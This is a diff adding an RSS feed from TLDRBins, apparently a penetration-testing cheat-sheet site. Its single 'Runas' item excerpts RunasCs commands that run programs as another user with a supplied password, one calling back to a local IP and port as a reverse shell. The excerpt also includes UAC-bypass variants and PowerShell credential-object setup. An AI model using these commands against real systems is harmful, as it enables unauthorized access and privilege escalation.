@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Cmdkey on TLDRBins</title>
+    <link>https://tldrbins.github.io/@cmdkey/</link>
+    <description>Recent content in Cmdkey on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@cmdkey/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Runas</title>
+      <link>https://tldrbins.github.io/runas/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/runas/</guid>
+      <description>RunasCS .\RunasCs.exe &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34; -r &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt; .\RunasCs.exe &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34; -l &amp;lt;LOGON_TYPE&amp;gt; # Or .\RunasCs.exe &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --bypass-uac &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34; -l &amp;lt;LOGON_TYPE&amp;gt; LOGON TYPE --------------------- 2 Interactive 3 Network 4 Batch 5 Service 7 Unlock 8 NetworkCleartext 9 NewCredentials 10 RemoteInteractive 11 CachedInteractive Ref: RunasCS&#xA;Runas (With Password and GUI) runas /user:&amp;#39;&amp;lt;USER&amp;gt;&amp;#39; &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34; runas /user:&amp;#39;admin&amp;#39; &amp;#34;powershell&amp;#34; # Bypass UAC start-process powershell.exe -verb runas Runas (With Cred Object) 1. Create Credential Object Method 1 Method 2 $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = New-Object System.</description>
+    </item>
+  </channel>
+</rss>
